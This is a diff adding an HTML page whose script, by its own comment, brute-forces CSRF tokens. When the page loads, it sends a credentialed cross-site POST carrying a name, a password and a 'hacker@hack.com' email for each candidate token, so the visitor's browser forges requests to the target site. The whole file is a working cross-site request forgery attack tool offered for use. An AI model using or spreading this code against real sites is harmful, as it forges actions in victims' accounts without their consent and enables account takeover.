@@ -1,0 +1,63 @@
+<!-- this script is for bruteforcing csrftokens that is low volum number 100 max if they are more that that use the web worker script -->
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+
+</head>
+<body>c7890  
+
+<textarea id="tokens">
+ssssssssssssssssssss
+aaaaaaaaaaaaaaaaaaaaa
+zzzzzzzzzzzzzzzzzzzzzzzz
+cccccccccccccccccczsdc
+</textarea>
+
+<script>
+    function XHRPost(tvalue)
+    {
+        var http = new XMLHttpRequest();
+        var token = tvalue;
+        var url = 'https://google.com/';
+        var params ={
+            "name":"adam",
+            "password":"password",
+            "email":"hacker@hack.com",
+            "csrftoken":token,
+        };
+        http.open("POST",url,true);
+        http.withCredentials = 'true';
+        http.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+        http.onreadystatechange = function()
+        {
+            if (http.readyState > 1 )
+            {
+                http.abort();
+            }
+        };
+    
+        //setalize the param object
+        queryparam = Object.keys(params).reduce(function(a,k){a.push(k+'='+encodeURIComponent(params[k]));
+            return a
+        },[]).join('&');
+
+        http.send(queryparam);
+
+    }
+
+    function bruteLoop(Tlist)
+    {
+        for (var i=0;i<Tlist.length;i++)
+        {
+            XHRPost(Tlist[i]);
+        }
+    }
+    //prepare the token list
+    var tokens = document.getElementById('tokens').value.replace(/\s+/gm,'\n').split('\n');
+    tokens = tokens.filter(Boolean); //rempve empty values
+
+bruteLoop(tokens)
+</script>
+</body>
+</html>
